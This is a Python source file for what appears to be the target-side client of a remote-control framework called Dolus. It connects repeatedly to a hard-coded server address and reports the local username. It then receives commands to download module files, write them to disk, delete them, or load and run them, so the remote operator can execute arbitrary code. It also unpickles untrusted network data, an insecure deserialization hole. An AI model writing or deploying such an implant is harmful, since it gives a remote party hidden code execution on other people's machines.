# Import libraries
import client_info
import command as command_template
import logger
import module_manager
import network
import os
import pickle
import time
from Modules import module

# Constants
SERVER_IP = '192.168.1.161'
SERVER_PORT = 2016


if __name__ == '__main__':
    # Initialize logger
    log = logger.init_log(True)

    # Create TCP client info
    program_info = client_info.DolusClientInfo()
    program_info.name = 'Test Client'
    program_info.username = os.getlogin()
    program_info.role = client_info.ROLE_TARGET
    program_info.version = '1.0'
    program_info.uuid = '5a0ea80d-33c1-4b0d-afc9-e03c39a0bdd6'

    # Initialize module manager
    manager = module_manager.ModuleManager()

    # Get module startup times
    module_times = manager.get_module_startups(manager.get_module_names())

    # Load STARTUP_ON_START modules
    on_start_modules = []

    for module_name, startup_time in module_times.items():
        if startup_time == module.STARTUP_ON_START:
            on_start_modules.append(manager.load_module(module_name))

    # Link module requirements
    for start_module in on_start_modules:
        for requirement in start_module.require:
            if requirement == module.REQUIRE_LOGGER:
                log.debug('Linking logger to module %s', start_module.__class__.__name__)
                start_module.logger = log

    # Start modules
    for start_module in on_start_modules:
        log.debug('Starting module %s', start_module.__class__.__name__)
        start_module.start()

    on_connect_modules = []
    while 1:
        # Start TCP client
        client = network.TCPClient(SERVER_IP, SERVER_PORT)

        # Wait until the client is connected
        while client.connect():
            time.sleep(3)

        from Modules import module
        # Load STARTUP_ON_CONNECT modules
        for module_name, startup_time in module_times.items():
            if startup_time == module.STARTUP_ON_CONNECT:
                on_connect_modules.append(manager.load_module(module_name))

        # Link module requirements
        for connect_module in on_connect_modules:
            for requirement in connect_module.require:
                if requirement == module.REQUIRE_TCP_CLIENT:
                    log.debug('Linking TCP client to module %s', connect_module.__class__.__name__)
                    connect_module.client = client

                if requirement == module.REQUIRE_LOGGER:
                    log.debug('Linking logger to module %s', connect_module.__class__.__name__)
                    connect_module.logger = log

        # Start modules
        for connect_module in on_connect_modules:
            log.debug('Starting module %s', connect_module.__class__.__name__)
            connect_module.start()

        # Send client info
        client.send(pickle.dumps(program_info))

        # Receive command queue
        command_queue = pickle.loads(client.receive())

        for command in command_queue:
            log.info('Received command %s %s', command.convert_type(command.type), command.module_file)

            if command.type == command.INSTALL_MODULE:
                try:
                    with open(f'Modules/{command.module_file}', 'wb+') as f:
                        f.write(client.receive())

                except Exception as error:
                    log.error('Error installing module %s: %s', command.module_file, error)
                    client.send(f'ERROR: {error}'.encode())
                    break

                log.info('Installed module %s', command.module_file)
                client.send(b'OK')

            if command.type == command.DELETE_MODULE:
                try:
                    os.remove(f'Modules/{command.module_file}')

                except Exception as error:
                    log.error('Error deleting module %s: %s', command.module_file, error)
                    client.send(f'ERROR: {error}'.encode())
                    break

                log.info('Deleted module %s', command.module_file)
                client.send(b'OK')

        while 1:
            command = pickle.loads(client.receive())

            if command.type == command_template.INSTALL_MODULE:
                try:
                    with open(f'Modules/{command.module_file}', 'wb+') as f:
                        f.write(client.receive())

                except Exception as error:
                    log.error('Error installing module %s: %s', command.module_file, error)
                    client.send(f'ERROR: {error}'.encode())
                    break

                log.info('Installed module %s', command.module_file)
                client.send(b'OK')

            if command.type == command_template.DELETE_MODULE:
                try:
                    os.remove(f'Modules/{command.module_file}')

                except Exception as error:
                    log.error('Error deleting module %s: %s', command.module_file, error)
                    client.send(f'ERROR: {error}'.encode())
                    break

                log.info('Deleted module %s', command.module_file)
                client.send(b'OK')

            if command.type == command_template.RUN_MODULE:
                try:
                    module = manager.load_module(command.module_file)
                    module.start()

                except Exception as error:
                    log.error('Error running module %s: %s', command.module_file, error)
                    client.send(f'ERROR: {error}'.encode())
                    break

                log.info('Ran module %s', command.module_file)
                client.send(b'OK')
